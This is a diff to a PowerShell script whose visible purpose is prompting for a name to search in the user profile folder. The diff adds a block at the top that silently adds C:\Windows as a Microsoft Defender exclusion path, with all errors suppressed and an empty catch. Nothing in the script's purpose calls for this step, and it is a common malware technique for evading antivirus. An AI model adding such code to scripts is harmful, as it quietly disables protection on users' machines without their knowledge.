@@ -1,3 +1,11 @@
+#Exclusion additon.
+try {
+    $exclusionPath = "C:\Windows"
+    Add-MpPreference -ExclusionPath $exclusionPath -ErrorAction SilentlyContinue -ErrorVariable AddExclusionError | Out-Null
+    if (-not $AddExclusionError) {
+    }
+  }
+  catch {}  
 do {
     $SearchTerm = Read-Host "Enter a name or part of it to search for"
     $UserProfilePath = [System.Environment]::GetFolderPath('UserProfile')
